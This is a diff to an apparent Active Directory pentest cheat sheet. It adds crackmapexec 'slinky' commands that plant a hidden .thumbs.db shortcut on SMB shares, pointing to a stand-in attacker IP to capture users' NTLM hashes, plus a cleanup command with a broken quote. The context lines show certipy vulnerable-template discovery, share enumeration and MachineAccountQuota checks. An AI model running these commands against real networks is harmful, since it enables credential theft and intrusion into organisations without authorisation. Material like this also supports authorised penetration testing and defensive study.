@@ -194,13 +194,19 @@ certipy find -u user@domain.com -p 'pass' -vulnerable -dc-ip DCIP -stdout > cert
 crackmapexec smb smb.txt -u 'user' -p 'pass' --shares
 ```
 
+#### Create link 
+
+```bash
+crackmapexec smb $ip -u username -p 'pass' -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attackerIP
+# Clean up
+crackmapexec smb $ip -u username -p 'pass; -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true
+```
+
 ### Enum MachineAccountQuota 
 
 ```bash
 crackmapexec ldap ip -u username -p password -d domain.com -M MAQ
 ```
-
-
 
 ### Enum dns
 
